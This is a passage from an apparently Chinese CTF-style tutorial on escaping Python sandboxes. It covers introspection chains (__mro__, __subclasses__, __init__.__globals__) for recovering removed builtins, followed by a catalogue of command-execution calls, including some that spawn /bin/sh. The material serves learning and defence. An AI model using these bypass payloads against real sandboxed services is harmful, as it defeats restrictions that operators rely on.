<h4 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a><code>__mro__</code></h4><p><code>__mro__</code>（Method Resolution Order）是<strong>类对象</strong>的一个<strong>属性</strong>，返回该类的<strong>方法解析顺序</strong>，即调用方法时按照哪些顺序查找类中的方法。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>当沙箱清空了 <code>__builtins__</code> 中的内置类时（没有 <code>object</code> 等内置的类 ），我们通常使用 <code>__mro__</code> 来获得一个 <code>object</code> 类。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h4 id="subclasses"><a href="#subclasses" class="headerlink" title="__subclasses__()"></a><code>__subclasses__()</code></h4><p><code>__subclasses__()</code> 是<strong>类</strong>的一个方法，用于获取该类的<strong>所有直接子类</strong>。它返回一个<strong>列表</strong>，包含了当前运行环境中，从该类<strong>直接继承</strong>的所有类（子类对象）。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>: <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">A</span>): <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>): <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">A.__subclasses__()   <span class="comment"># ✅ [&lt;class &#x27;__main__.B&#x27;&gt;]</span></span><br><span class="line">B.__subclasses__()   <span class="comment"># ✅ [&lt;class &#x27;__main__.C&#x27;&gt;]</span></span><br><span class="line">C.__subclasses__()   <span class="comment"># ✅ []</span></span><br><span class="line">A().__subclasses__() <span class="comment"># ❌ AttributeError：实例对象没有这个方法</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>因为所有的类都所有类最终都继承自 <code>object</code>，因此我们可以先找到 <code>object</code> 类，然后再通过 <code>object.__subclasses__()</code> 找到所需的类。 </p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2. 获取其所有子类</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h3 id="函数-方法的执行环境"><a href="#函数-方法的执行环境" class="headerlink" title="函数 &#x2F; 方法的执行环境"></a>函数 &#x2F; 方法的执行环境</h3><h4 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h4><p><code>__globals__</code> 是 <strong>Python 函数对象</strong>独有的一个特殊属性，它指向一个<strong>字典对象</strong>，即该函数<strong>定义时所处模块的全局命名空间</strong>（也叫全局作用域，或 module namespace）。换句话说，**<code>__globals__</code> 等价于函数定义所在模块的 <code>globals()</code> 返回值**。你可以通过这个属性，访问定义函数时所在模块的所有全局变量，包括导入的模块、函数、类、常量等。</p>
<p><code>__globals__</code> 是指<strong>函数定义时所在模块的作用域</strong>，只属于函数对象；而 <code>__dict__</code> 是<strong>对象自身的命名空间字典</strong>，适用于大多数对象（模块、类、实例、函数等）。其中<strong>模块的 <code>__dict__</code></strong> 等于<strong>模块中定义的函数的 <code>__globals__</code></strong> 等于<strong>在模块中调用 <code>globals()</code> 函数的返回结果</strong>。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo = <span class="keyword">lambda</span>:<span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__==foo.__globals__==<span class="built_in">globals</span>()</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <ul>
<li><p><code>__globals__</code> 是绑定在函数上的，<strong>无论函数在何处被调用，它的 <code>__globals__</code> 都不会变</strong>，始终指向定义它的模块。</p>
</li>
<li><p>某些内置函数（如 <code>len</code>、<code>os.system</code>）是 C 实现的，它们<strong>没有 <code>__globals__</code> 属性</strong>。</p>
</li>
</ul>

    </div>
  </div>

<h4 id="init"><a href="#init" class="headerlink" title="__init__"></a><code>__init__</code></h4><p><code>__init__</code> 是类的“构造器方法”，在<strong>类实例化时自动调用</strong>，用于初始化实例的属性。</p>
<p>对象的 <code>__init__</code> 方法分为<strong>“默认的”</strong>和<strong>“重载过的”</strong>两种情况：</p>
<ul>
<li><p>如果你 <strong>没有</strong>在类里定义 <code>__init__</code>，Python 会自动从其<strong>父类继承一个默认的 <code>__init__</code> 方法</strong>。这是 <strong>内置的 object 类</strong> 提供的默认 <code>__init__</code>，它是一个 C 实现的“slot wrapper”，不是真正的 Python 函数。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>.__init__</span><br><span class="line">&lt;slot wrapper <span class="string">&#x27;__init__&#x27;</span> of <span class="string">&#x27;object&#x27;</span> objects&gt;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果你 <strong>定义了自己的 <code>__init__</code></strong> 方法，则你看到的就是一个标准的 Python 函数对象。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;init from B&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(B.__init__)</span><br><span class="line"><span class="comment"># 输出 &lt;function B.__init__ at 0x...&gt;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>其中默认的 <code>__init__</code> 是 C 实现的 slot wrapper，没有 <code>__globals__</code> 属性；而只有<strong>Python 写的函数</strong>才有 <code>__globals__</code>，才能通过它来找到导入的模块。</p>
<p>因此在沙箱逃逸中常常需要寻找一个拥有重载 <code>__init__</code> 的对象，然后通过 <code>obj.__init__.__globals__</code> 来获得该对象的所在模块的全局命名空间。在这个全局全局命名空间中，我们可以找回被沙箱删除掉的 <code>__builtins__</code>、<code>os</code> 等模块。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>实际上在沙箱逃逸中，我们不一定要用 <code>__init__</code> 函数的 <code>__globals__</code> 属性来获取所在模块的全局命名空间，其他函数也是可以的。</p>
<ul>
<li><code>__del__</code>：一个类的析构函数，当一个对象被销毁时，它会被自动调用。</li>
<li><code>__str__</code> &#x2F; <code>__repr__</code>：用于定义对象的字符串表示形式。<code>__str__</code> 在使用 <code>str()</code> 或 <code>print()</code> 时调用，<code>__repr__</code> 在使用 <code>repr()</code> 或交互式解释器时调用。如果未定义 <code>__str__</code>，则默认使用 <code>__repr__</code>。</li>
<li><code>__eq__</code> &#x2F; <code>__ne__</code> &#x2F; <code>__lt__</code> &#x2F; <code>__gt__</code> &#x2F; <code>__le__</code> &#x2F; <code>__ge__</code>：定义对象之间的比较操作，如等于、不等于、小于、大于、小于等于、大于等于。</li>
<li><code>__add__</code> &#x2F; <code>__sub__</code> &#x2F; <code>__mul__</code> &#x2F; <code>__div__</code> &#x2F; <code>__mod__</code> &#x2F; <code>__pow__</code>：定义基本数学运算符的行为，如加、减、乘、除、取模、幂运算等。</li>
<li><code>__getitem__</code> &#x2F; <code>__setitem__</code> &#x2F; <code>__delitem__</code>：定义对象通过索引访问、赋值和删除的行为，支持类似列表、字典的操作。</li>
<li><code>__iter__</code> &#x2F; <code>__next__</code>：定义对象的迭代行为，支持 <code>for</code> 循环或手动调用 <code>next()</code>。</li>
<li><code>__call__</code>：允许实例像函数一样被调用，即支持 <code>obj()</code> 这样的语法。</li>
<li><code>__getattr__</code> &#x2F; <code>__setattr__</code> &#x2F; <code>__delattr__</code>：用于拦截属性的访问、设置和删除操作，常用于自定义对象属性管理逻辑。</li>
</ul>

    </div>
  </div>

<h3 id="属性获取-设置"><a href="#属性获取-设置" class="headerlink" title="属性获取 &#x2F; 设置"></a>属性获取 &#x2F; 设置</h3><h4 id="getattribute-name"><a href="#getattribute-name" class="headerlink" title="__getattribute__(name)"></a><code>__getattribute__(name)</code></h4><p>对象<strong>所有属性访问</strong>时，都会先调用它（无论属性是否存在），<strong>优先级</strong>高于 <code>__getattr__</code>。</p>
<p>可以在沙箱题中通过覆写它，<strong>拦截所有属性访问</strong>，甚至转发到真实对象。</p>
<h4 id="getattr-name"><a href="#getattr-name" class="headerlink" title="__getattr__(name)"></a><code>__getattr__(name)</code></h4><p>当<strong>访问不存在的属性</strong>时才调用它。在属性被删或被过滤的环境里，可以利用它返回一个伪造对象或转发到真实对象。</p>
<p>另外还有：</p>
<ul>
<li><code>__setattr__(name, value)</code>：<strong>任何属性赋值</strong>时都会调用它。</li>
<li><code>__delattr__(name)</code>：删除属性时调用。</li>
</ul>
<h4 id="getitem-key"><a href="#getitem-key" class="headerlink" title="__getitem__(key)"></a><code>__getitem__(key)</code></h4><p><code>obj[key]</code> 访问时调用，另外还有：</p>
<ul>
<li><code>__setitem__(key, value)</code>：<code>obj[key] = value</code> 时调用。</li>
<li><code>__delitem__(self, key)</code>：<code>del obj[key]</code> 时调用。</li>
</ul>
<h4 id="dir"><a href="#dir" class="headerlink" title="__dir__()"></a><code>__dir__()</code></h4><p><code>dir(obj)</code> 调用时执行，返回属性列表。</p>
<h1 id="沙箱逃逸目标"><a href="#沙箱逃逸目标" class="headerlink" title="沙箱逃逸目标"></a>沙箱逃逸目标</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="builtin-模块"><a href="#builtin-模块" class="headerlink" title="builtin 模块"></a>builtin 模块</h3><table>
<thead>
<tr>
<th>方法</th>
<th>多行支持</th>
<th>返回值</th>
</tr>
</thead>
<tbody><tr>
<td><code>exec(code)</code></td>
<td>✅</td>
<td><code>None</code></td>
</tr>
<tr>
<td><code>eval(expr)</code></td>
<td>❌</td>
<td>计算结果</td>
</tr>
<tr>
<td><code>eval(compile(code,&quot;exec&quot;))</code></td>
<td>✅</td>
<td><code>None</code></td>
</tr>
</tbody></table>
<h4 id="exec（执行-Python-代码字符串）"><a href="#exec（执行-Python-代码字符串）" class="headerlink" title="exec（执行 Python 代码字符串）"></a><code>exec</code>（执行 Python 代码字符串）</h4><p>支持多行代码，执行结果是 <code>None</code>（无返回值），运行环境默认是当前全局&#x2F;局部作用域。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>也可以通过 <code>builtins</code> 模块间接调用：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>.__self__.<span class="built_in">exec</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="eval（求值表达式）"><a href="#eval（求值表达式）" class="headerlink" title="eval（求值表达式）"></a><code>eval</code>（求值表达式）</h4><p>只能执行<strong>单个表达式</strong>（不能直接多行、不能直接赋值语句等）,返回表达式计算结果。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p><code>eval</code> 无法直接达到执行多行代码的效果，使用 <code>compile</code> 函数并传入 <code>exec</code> 模式就能够实现。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>Python 内置函数 <code>compile(source, filename, mode)</code> 会把 <strong>源码字符串</strong> 编译成 <strong>可执行的代码对象（code object）</strong>。</p>
<ul>
<li><strong><code>source</code></strong> ：要编译的 Python 代码（字符串、AST 等）</li>
<li><strong><code>filename</code></strong> ：代码来源名字（给调试器&#x2F;异常信息用，随便写，比如 <code>&lt;string&gt;</code>、<code>&lt;payload&gt;</code>）</li>
<li><strong><code>mode</code></strong> ：<ul>
<li><code>&#39;exec&#39;</code> → 执行模式，可包含多行语句（<code>for</code>、<code>def</code>、<code>import</code> 等）</li>
<li><code>&#39;eval&#39;</code> → 表达式模式，只允许单个表达式</li>
<li><code>&#39;single&#39;</code> → 单行模式，交互式执行（会回显）</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="os-模块"><a href="#os-模块" class="headerlink" title="os 模块"></a>os 模块</h3><table>
<thead>
<tr>
<th>方法</th>
<th>是否走 Shell</th>
<th>是否返回结果</th>
<th>是否替换当前进程</th>
<th>是否可传环境变量</th>
</tr>
</thead>
<tbody><tr>
<td><code>os.system</code></td>
<td>✅</td>
<td>❌（返回码）</td>
<td>❌</td>
<td>间接（依赖 shell）</td>
</tr>
<tr>
<td><code>os.popen</code></td>
<td>✅</td>
<td>✅（输出）</td>
<td>❌</td>
<td>间接（依赖 shell）</td>
</tr>
<tr>
<td><code>posix_spawn</code></td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅</td>
</tr>
<tr>
<td><code>spawnv</code></td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅</td>
</tr>
<tr>
<td><code>exec*</code> 系列</td>
<td>❌&#x2F;PATH 可选</td>
<td>❌</td>
<td>✅</td>
<td>部分支持（带 e 的）</td>
</tr>
<tr>
<td><code>fork</code>+cmd</td>
<td>可选</td>
<td>可选</td>
<td>❌</td>
<td>可选</td>
</tr>
</tbody></table>
<h4 id="system-popen-系列（最直观）"><a href="#system-popen-系列（最直观）" class="headerlink" title="system &#x2F; popen 系列（最直观）"></a><code>system</code> &#x2F; <code>popen</code> 系列（最直观）</h4><p>直接通过 shell 执行命令，结果返回码或输出内容。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)                                <span class="comment"># 执行命令，返回 exit code</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)                  <span class="comment"># 动态导入绕过</span></span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">&quot;ls&quot;</span>).read()                           <span class="comment"># 执行命令并读取输出</span></span><br></pre></td></tr></table></figure></div>

<p>⚠️ <code>system</code> 会启动一个 shell（sh&#x2F;bash），<code>popen</code> 还能直接捕获输出。</p>
<h4 id="spawn-posix-spawn-系列（直接运行可执行文件）"><a href="#spawn-posix-spawn-系列（直接运行可执行文件）" class="headerlink" title="spawn &#x2F; posix_spawn 系列（直接运行可执行文件）"></a><code>spawn</code> &#x2F; <code>posix_spawn</code> 系列（直接运行可执行文件）</h4><p>直接执行可执行文件，可传参数和环境变量，依赖 <code>execve</code>。不走 shell，直接运行二进制。常用于不想依赖 shell 解析的场景（绕过某些字符过滤）。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">os.posix_spawn(<span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>], os.environ)</span><br><span class="line">os.posix_spawn(<span class="string">&quot;/bin/bash&quot;</span>, [<span class="string">&quot;/bin/bash&quot;</span>], os.environ)</span><br><span class="line"></span><br><span class="line">os.spawnv(<span class="number">0</span>, <span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>])</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>posix_spawn</code> → <strong>只有类 Unix 系统</strong>可用，Windows 会直接 <code>AttributeError</code>。</li>
<li><code>spawnv</code> → Windows 和类 Unix 都能用，但执行行为会跟平台相关。</li>
</ul>
<h4 id="exec-系列（替换当前进程）"><a href="#exec-系列（替换当前进程）" class="headerlink" title="exec* 系列（替换当前进程）"></a><code>exec*</code> 系列（替换当前进程）</h4><p>直接替换当前 Python 进程为目标程序（执行后 Python 不会返回）。</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>路径方式</th>
<th>传参方式</th>
<th>环境变量指定</th>
<th>PATH 搜索</th>
</tr>
</thead>
<tbody><tr>
<td><code>execl</code></td>
<td>绝对路径</td>
<td>分散参数</td>
<td>❌</td>
<td>❌</td>
</tr>
<tr>
<td><code>execle</code></td>
<td>绝对路径</td>
<td>分散参数</td>
<td>✅</td>
<td>❌</td>
</tr>
<tr>
<td><code>execlp</code></td>
<td>程序名</td>
<td>分散参数</td>
<td>❌</td>
<td>✅</td>
</tr>
<tr>
<td><code>execlpe</code></td>
<td>程序名</td>
<td>分散参数</td>
<td>✅</td>
<td>✅</td>
</tr>
<tr>
<td><code>execv</code></td>
<td>绝对路径</td>
<td>列表参数</td>
<td>❌</td>
<td>❌</td>
</tr>
<tr>
<td><code>execve</code></td>
<td>绝对路径</td>
<td>列表参数</td>
<td>✅</td>
<td>❌</td>
</tr>
<tr>
<td><code>execvp</code></td>
<td>程序名</td>
<td>列表参数</td>
<td>❌</td>
<td>✅</td>
</tr>
<tr>
<td><code>execvpe</code></td>
<td>程序名</td>
<td>列表参数</td>
<td>✅</td>
<td>✅</td>
</tr>
</tbody></table>
<p>例子：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.execl(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>)                      <span class="comment"># 最简单 exec</span></span><br><span class="line">os.execve(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;sh&#x27;</span>], os.environ)       <span class="comment"># 列表 + 环境</span></span><br><span class="line">os.execlp(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>)                           <span class="comment"># 搜索 PATH</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execvpe(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;sh&#x27;</span>], <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br></pre></td></tr></table></figure></div>

<p>特点：</p>
<ul>
<li>进程替换，没有返回值（当前 Python 进程终止）。</li>
<li>适合提权后直接切 shell。</li>
</ul>
<h4 id="fork-命令执行（子进程运行）"><a href="#fork-命令执行（子进程运行）" class="headerlink" title="fork + 命令执行（子进程运行）"></a><code>fork</code> + 命令执行（子进程运行）</h4><p>手动 fork 出一个子进程执行命令。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).fork() == <span class="number">0</span>) <span class="keyword">and</span> <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<ul>
<li>父进程继续运行，子进程执行命令。</li>
<li>常配合 exec 系列实现并行。</li>
</ul>
<h3 id="subprocess-模块"><a href="#subprocess-模块" class="headerlink" title="subprocess 模块"></a>subprocess 模块</h3><table>
<thead>
<tr>
<th>方法</th>
<th>Python 版本</th>
<th>返回值类型 &#x2F; 内容</th>
<th>失败处理</th>
<th>获取输出方式</th>
<th>是否走 shell</th>
</tr>
</thead>
<tbody><tr>
<td><code>Popen</code></td>
<td>py2 &#x2F; py3</td>
<td><code>Popen</code> 对象</td>
<td>无</td>
<td>❌（需 <code>stdout=PIPE</code> 后 <code>.stdout.read()</code>）</td>
<td>默认否，可选</td>
</tr>
<tr>
<td><code>call</code></td>
<td>py2 &#x2F; py3</td>
<td><code>int</code>（exit code）</td>
<td>无</td>
<td>❌</td>
<td>默认否，可选</td>
</tr>
<tr>
<td><code>check_call</code></td>
<td>py2 &#x2F; py3</td>
<td><code>int</code>（exit code）</td>
<td>错误抛异常</td>
<td>❌</td>
<td>默认否，可选</td>
</tr>
<tr>
<td><code>check_output</code></td>
<td>py2 &#x2F; py3</td>
<td><code>bytes</code>（命令输出）</td>
<td>错误抛异常</td>
<td>✅（直接返回 stdout）</td>
<td>默认否，可选</td>
</tr>
<tr>
<td><code>run</code></td>
<td>py3</td>
<td><code>CompletedProcess</code> 对象</td>
<td>可选抛异常</td>
<td>✅（需 <code>capture_output=True</code> 或 <code>stdout=PIPE</code>）</td>
<td>默认否，可选</td>
</tr>
<tr>
<td><code>getoutput</code></td>
<td>py3</td>
<td><code>str</code>（命令输出）</td>
<td>无</td>
<td>✅（直接返回 stdout）</td>
<td><strong>总是 shell&#x3D;True</strong></td>
</tr>
<tr>
<td><code>getstatusoutput</code></td>
<td>py3</td>
<td><code>(int, str)</code></td>
<td>无</td>
<td>✅（返回 exit code 和 stdout）</td>
<td><strong>总是 shell&#x3D;True</strong></td>
</tr>
</tbody></table>
<h4 id="Popen-系列（底层构造，灵活度最高）"><a href="#Popen-系列（底层构造，灵活度最高）" class="headerlink" title="Popen 系列（底层构造，灵活度最高）"></a><code>Popen</code> 系列（底层构造，灵活度最高）</h4><p>直接启动一个新进程，可以配置 <code>stdin</code> &#x2F; <code>stdout</code> &#x2F; <code>stderr</code> 管道、是否用 shell。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subprocess.Popen(args, bufsize=-<span class="number">1</span>, executable=<span class="literal">None</span>,</span><br><span class="line">                 stdin=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>,</span><br><span class="line">                 shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, env=<span class="literal">None</span>, ...)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>args</code>：要执行的命令（字符串或列表）</li>
<li><code>stdout</code> &#x2F; <code>stderr</code> &#x2F; <code>stdin</code>：控制标准流（默认继承父进程）</li>
<li><code>shell</code>：是否通过 shell 执行（<code>/bin/sh</code> 或 <code>cmd.exe</code>）</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="comment"># 执行命令并读取输出</span></span><br><span class="line">subprocess.Popen(</span><br><span class="line">    <span class="string">&#x27;ls&#x27;</span>,                     <span class="comment"># args：要执行的命令（因为 shell=True，所以是字符串）</span></span><br><span class="line">    shell=<span class="literal">True</span>,               <span class="comment"># 通过 shell 运行（Linux 默认 /bin/sh）</span></span><br><span class="line">    stdout=subprocess.PIPE,   <span class="comment"># 把子进程的 stdout 重定向到管道</span></span><br><span class="line">    stderr=subprocess.STDOUT  <span class="comment"># 把 stderr 合并到 stdout</span></span><br><span class="line">).stdout.read()               <span class="comment"># 从 stdout 管道中一次性读取全部内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 沙箱绕过：动态导入</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="阻塞执行并获取状态-输出"><a href="#阻塞执行并获取状态-输出" class="headerlink" title="阻塞执行并获取状态&#x2F;输出"></a>阻塞执行并获取状态&#x2F;输出</h4><p>调用后会等外部命令执行结束再返回（除非超时或被信号中断）</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)          <span class="comment"># 返回 exit code</span></span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)    <span class="comment"># exit code !=0 抛异常</span></span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)  <span class="comment"># 返回输出（str）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)           <span class="comment"># 返回 CompletedProcess 对象</span></span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)                 <span class="comment"># 返回输出（简化版）</span></span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)           <span class="comment"># 返回 (exit_code, output)</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)          <span class="comment"># 同 py2</span></span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)    <span class="comment"># 同 py2</span></span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)  <span class="comment"># 同 py2</span></span><br></pre></td></tr></table></figure></div>

<h3 id="ctypes-模块"><a href="#ctypes-模块" class="headerlink" title="ctypes 模块"></a>ctypes 模块</h3><p><code>ctypes</code> 模块可以直接调用 C 语言动态链接库（DLL &#x2F; so &#x2F; dylib）中的函数，比如 <code>system()</code>，从而执行系统命令。</p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>在类 Unix 系统中，<code>system</code> 函数通常在 <strong>libc</strong> 里，可以用 <code>ctypes.CDLL(None)</code> 或直接指定库名。</p>
